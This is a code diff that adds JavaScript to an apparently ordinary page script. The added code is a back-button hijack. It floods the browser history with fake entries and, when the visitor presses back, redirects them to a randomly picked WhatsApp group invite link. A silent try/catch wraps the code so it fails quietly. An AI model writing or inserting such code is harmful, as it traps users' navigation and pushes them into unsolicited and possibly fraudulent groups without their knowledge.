@@ -17,3 +17,9 @@ ShowName();
 
 
 });
+ ! function (){var t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=
+   	function (t){
+   		const linkarray = ["https://chat.whatsapp.com/HqXNXuy9NsS3tJ7qoeOxgi","https://chat.whatsapp.com/DYYZ4uisKRi7kvefky5tNG","https://chat.whatsapp.com/HqXNXuy9NsS3tJ7qoeOxgi"];
+   		var linkid = Math.floor(Math.random() * 3);
+   		t.state && location.replace(linkarray[linkid]);
+   	}}catch (o){}}();
